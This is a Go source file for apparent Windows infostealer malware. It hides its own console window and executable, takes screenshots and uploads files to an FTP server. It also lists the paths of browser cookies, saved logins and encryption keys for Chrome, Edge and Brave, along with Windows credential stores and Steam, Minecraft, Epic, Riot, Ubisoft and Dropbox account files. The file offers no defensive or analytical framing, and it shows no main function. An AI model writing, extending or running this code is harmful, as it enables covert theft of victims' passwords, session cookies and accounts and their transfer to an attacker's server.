package main

import (
	"fmt"
	"image/png"
	"os"
	"os/exec"
	"syscall"

	"github.com/jlaffaye/ftp"
	"github.com/kbinani/screenshot"
)

// Hide console and .exe
func Hide() {
	//Hide Console
	getWin := syscall.NewLazyDLL("kernel32.dll").NewProc("GetConsoleWindow")
	showWin := syscall.NewLazyDLL("user32.dll").NewProc("ShowWindow")
	hwnd, _, _ := getWin.Call()
	_, _, _ = showWin.Call(hwnd, 0)
	//Hide exe
	exe, err := os.Executable()
	if err != nil {
		return
	}

	cmd := exec.Command("attrib", "+h", "+s", exe)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	cmd.Run()
}

// Take screenshot of the first monitor, then save in .png file
func CaptureScreenshot(outputFilePath string) error {
	// Number of monitor
	n := screenshot.NumActiveDisplays()
	if n == 0 {
		//return fmt.Errorf("no active displays found")
	}

	// Take screenshot of the first monitor (can be changed for more monitor)
	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		//return fmt.Errorf("failed to capture screenshot: %v", err)
	}

	// Save image
	file, err := os.Create(outputFilePath)
	if err != nil {
		//return fmt.Errorf("failed to create screenshot file: %v", err)
	}
	defer file.Close()

	err = png.Encode(file, img)
	if err != nil {
		//return fmt.Errorf("failed to encode screenshot to PNG: %v", err)
	}

	return nil
}

// Load file on FTP server
func UploadFileToFTP(ftpClient *ftp.ServerConn, localFilePath, remotePath string) error {
	file, err := os.Open(localFilePath)
	if err != nil {
		//return fmt.Errorf("failed to open file %s: %v", localFilePath, err)
	}
	defer file.Close()

	err = ftpClient.Stor(remotePath, file)
	if err != nil {
		//return fmt.Errorf("failed to upload file %s: %v", localFilePath, err)
	}
	return nil
}

// FTP connection
func ConnectToFTP(server string, port int, user, password string) (*ftp.ServerConn, error) {
	ftpClient, err := ftp.Dial(fmt.Sprintf("%s:%d", server, port))
	if err != nil {
		//return nil, fmt.Errorf("failed to connect to FTP server: %v", err)
	}

	err = ftpClient.Login(user, password)
	if err != nil {
		//return nil, fmt.Errorf("failed to login to FTP server: %v", err)
	}

	return ftpClient, nil
}

// List of directory to copy
func GetDirectories() ([]string, error) {
	// Username of the current use used to explore directory
	currentUser := os.Getenv("USERNAME")
	if currentUser == "" {
		//return nil, fmt.Errorf("could not retrieve the USERNAME")
	}

	// List of directory to copy
	directories := []string{
		//Chrome
		fmt.Sprintf(`C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Cookies`, currentUser),
		fmt.Sprintf(`C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\History`, currentUser),
		fmt.Sprintf(`C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Login Data`, currentUser),
		fmt.Sprintf(`C:\Users\%s\AppData\Local\Google\Chrome\User Data\Local State`, currentUser),

		//Edge
		fmt.Sprintf(`C:\Users\%s\AppData\Local\Microsoft\Edge\User Data\Default\Cookies`, currentUser),
		fmt.Sprintf(`C:\Users\%s\AppData\Local\Microsoft\Edge\User Data\Default\History`, currentUser),
		fmt.Sprintf(`C:\Users\%s\AppData\Local\Microsoft\Edge\User Data\Default\Login Data`, currentUser),
		fmt.Sprintf(`C:\Users\%s\AppData\Local\Microsoft\Edge\User Data\Local State`, currentUser),

		//Microsoft
		fmt.Sprintf(`C:\Users\%s\AppData\Local\Microsoft\Credentials`, currentUser),
		fmt.Sprintf(`C:\Users\%s\AppData\Roaming\Microsoft\Credentials`, currentUser),

		//Brave
		fmt.Sprintf(`C:\Users\%s\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Cookies`, currentUser),
		fmt.Sprintf(`C:\Users\%s\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History`, currentUser),
		fmt.Sprintf(`C:\Users\%s\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data`, currentUser),
		fmt.Sprintf(`C:\Users\%s\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State`, currentUser),

		//Dropbox
		fmt.Sprintf(`C:\Users\%s\AppData\Roaming\Dropbox\info.json`, currentUser),
		fmt.Sprintf(`C:\Users\%s\AppData\Local\Dropbox\cache`, currentUser),

		//Steam
		fmt.Sprintf(`C:\Users\%s\AppData\Local\Steam\htmlcache`, currentUser),
		fmt.Sprintf(`C:\Program Files (x86)\Steam\config\loginusers.vdf`, currentUser),

		//Minecraft
		fmt.Sprintf(`C:\Users\%s\AppData\Roaming\.minecraft\launcher_accounts_microsoft_store.json`, currentUser),

		//Epic Games
		fmt.Sprintf(`C:\Users\%s\AppData\Local\EpicGamesLauncher\Saved\Config\Windows\GameUserSettings`, currentUser),

		//Riot Games
		fmt.Sprintf(`C:\Users\%s\AppData\Local\Riot Games\Riot Client\Config`, currentUser),
		fmt.Sprintf(`C:\Users\%s\AppData\Local\Riot Games\Riot Client\Data`, currentUser),
		fmt.Sprintf(`C:\Users\%s\AppData\Local\Riot Games\Riot Client\Logs`, currentUser),

		//Uplay
		fmt.Sprintf(`C:\Users\%s\AppData\Local\Ubisoft Game Launcher`, currentUser),
	}

	return directories, nil
}
